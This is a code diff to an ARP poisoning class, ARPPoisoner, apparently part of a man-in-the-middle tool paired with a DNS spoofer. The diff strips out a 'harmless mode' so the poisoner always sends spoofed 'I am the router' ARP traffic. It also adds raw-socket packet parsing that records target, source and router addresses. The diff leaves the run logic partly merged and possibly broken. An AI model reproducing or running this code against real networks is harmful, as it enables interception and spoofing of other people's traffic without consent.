@@ -1195,14 +1195,7 @@ class ARPPoisoner(Thread):
 
   def run(self):
     self.create_device_socket()
-    if context.options.no_arp:
-      arp_logger.info("ARP server started in harmless mode.")
-      self._pariodically_update_router_adress()
-    else:
-      if self.context.options.respond_only:
-        self._run_on_responses()
-      else:
-        self._run_at_pace()
+    self._run_at_pace()
 
   def create_device_socket(self):
     elevate_privilege()
@@ -1224,20 +1217,13 @@ class ARPPoisoner(Thread):
     arp_logger.info("ARP poisonner started: 1 ARP per %d seconds." % (
       self.context.options.arp_elapse_time
     ))
-    while self.running:
-      self.update_router_adress()
-      self.send_i_is_the_rooter()
-      time.sleep(self.context.options.arp_elapse_time)
-
-  def _run_on_responses(self):
-    self.running = True
     elevate_privilege()
     s = socket.socket(
       socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003)
     )
     lower_privilege()
+    self.ctx = TmpCtx()
     s.settimeout(1)
-    arp_logger.info("ARP poisonner started: Interactive mode.")
     while self.running:
       try:
         if self.context.options.router_mac is None:
@@ -1250,14 +1236,24 @@ class ARPPoisoner(Thread):
         continue
       except KeyboardInterrupt:
         self.stop()
-    self.device_socket.close()
 
-  def _pariodically_update_router_adress(self):
-    self.running = True
-    arp_logger.info("Just update the ARP table for the DNS spoofer.")
-    while self.running:
-      self.update_router_adress()
-      time.sleep(self.context.options.arp_elapse_time)
+  def init_tmp_ctx(self, packet):
+    self.ctx.raw_target_ip = packet.arp_ip_target
+    self.ctx.raw_target_mac = packet.eth_mac_target
+    self.ctx.raw_source_ip = packet.arp_ip_source
+    self.ctx.raw_source_mac = packet.eth_mac_source
+    self.ctx.target_ip = socket.inet_ntoa(packet.arp_ip_target)
+    self.ctx.target_mac = raw_to_mac(self.ctx.raw_target_mac)
+    self.ctx.source_ip = socket.inet_ntoa(packet.arp_ip_source)
+    self.ctx.source_mac = raw_to_mac(self.ctx.raw_source_mac)
+    self.ctx.router_ip = self.context.router_ip
+    self.ctx.router_mac = self.context.router_mac
+    self.ctx.raw_router_ip = pack(
+      "!4B", *map(int, self.ctx.router_ip.split("."))
+    )
+    self.ctx.raw_router_mac = pack(
+      "!6B", *[int(x, 16) for x in self.ctx.router_mac.split(":")]
+    )
 
   def update_router_adress(self):
     if time.time() - self.context.last_router_mac_update > 3600:
